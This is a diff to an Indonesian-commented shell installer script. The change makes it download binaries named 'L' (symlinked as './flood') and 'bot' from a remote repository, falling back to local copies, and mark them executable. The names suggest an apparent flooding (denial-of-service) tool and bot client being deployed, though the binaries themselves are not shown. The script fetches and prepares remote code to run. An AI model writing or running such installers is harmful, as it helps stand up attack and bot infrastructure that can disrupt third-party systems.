@@ -30,15 +30,13 @@ echo "=================================================="
 
 # ---- biner L (disimpan sebagai ./L + symlink ./flood) ----
 L_OK=0
-if [ -f "${SCRIPT_DIR}/L" ]; then
-    echo "[*] Menggunakan biner L lokal..."
-    cp -f "${SCRIPT_DIR}/L" "./L"
+echo "[*] Download biner L (statik) dari repo..."
+if download_file "${REPO_BASE}/Lsetup/L" "./L" && [ -s "./L" ] && [ -x "./L" ] || [ -s "./L" ]; then
     L_OK=1
-else
-    echo "[*] Download biner L..."
-    if download_file "${REPO_BASE}/Lsetup/L" "./L" && [ -s "./L" ]; then
-        L_OK=1
-    fi
+fi
+if [ "${L_OK}" -eq 0 ] && [ -f "${SCRIPT_DIR}/L" ]; then
+    echo "[!] Download gagal, pakai biner L lokal..."
+    cp -f "${SCRIPT_DIR}/L" "./L" && L_OK=1
 fi
 
 chmod +x "./L" 2>/dev/null || true
@@ -53,15 +51,13 @@ fi
 
 # ---- bot biner ----
 BOT_OK=0
-if [ -f "${SCRIPT_DIR}/bot" ]; then
-    echo "[*] Menggunakan biner bot lokal..."
-    cp -f "${SCRIPT_DIR}/bot" "./bot"
+echo "[*] Download biner bot..."
+if download_file "${REPO_BASE}/Lsetup/bot" "./bot" && [ -s "./bot" ]; then
     BOT_OK=1
-else
-    echo "[*] Download biner bot..."
-    if download_file "${REPO_BASE}/Lsetup/bot" "./bot" && [ -s "./bot" ]; then
-        BOT_OK=1
-    fi
+fi
+if [ "${BOT_OK}" -eq 0 ] && [ -f "${SCRIPT_DIR}/bot" ]; then
+    echo "[!] Download bot gagal, pakai biner bot lokal..."
+    cp -f "${SCRIPT_DIR}/bot" "./bot" && BOT_OK=1
 fi
 chmod +x "./bot" 2>/dev/null || true
 
